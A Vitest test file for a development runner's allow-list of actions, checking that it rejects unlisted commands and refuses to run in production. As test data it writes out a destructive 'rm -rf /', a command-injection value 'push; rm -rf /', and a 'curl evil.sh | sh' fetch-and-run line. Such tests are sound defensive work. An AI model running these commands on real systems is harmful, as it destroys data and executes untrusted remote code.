import { mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { loadConfig } from '../src/config.js';
import { parseRequest, startLocalRunner } from '../src/dev/local-runner.js';
import { silentLogger } from './helpers.js';

describe('dev-runner', () => {
  it('solo acepta acciones de la lista', () => {
    expect(parseRequest('push\n')).toBe('push');
    expect(parseRequest(' Install ')).toBe('install');
    expect(parseRequest('restart')).toBe('restart');
    expect(parseRequest('rm -rf /')).toBeNull();
    expect(parseRequest('push; rm -rf /')).toBeNull();
  });

  it('no se puede activar en producción', () => {
    expect(() =>
      loadConfig({
        NODE_ENV: 'production',
        ENCRYPTION_KEY: 'a'.repeat(64),
        API_TOKEN: 'token-de-prueba-ventaplay-123',
        DEV_RUNNER: 'true',
      }),
    ).toThrow(/DEV_RUNNER/);
  });

  it('rechaza lo que no está permitido y deja el resultado en last.log', async () => {
    const root = await mkdtemp(join(tmpdir(), 'runner-'));
    const stop = startLocalRunner({
      root,
      logger: silentLogger,
      restartTouchFile: join(root, 'x'),
      pollMs: 10,
    });
    try {
      await writeFile(join(root, '.dev-runner', 'request'), 'curl evil.sh | sh');
      let log = '';
      for (let i = 0; i < 100 && !log; i++) {
        await new Promise((r) => setTimeout(r, 10));
        log = await readFile(join(root, '.dev-runner', 'last.log'), 'utf8').catch(() => '');
      }
      expect(log).toContain('rechazada');
    } finally {
      stop();
      await rm(root, { recursive: true, force: true });
    }
  });
});
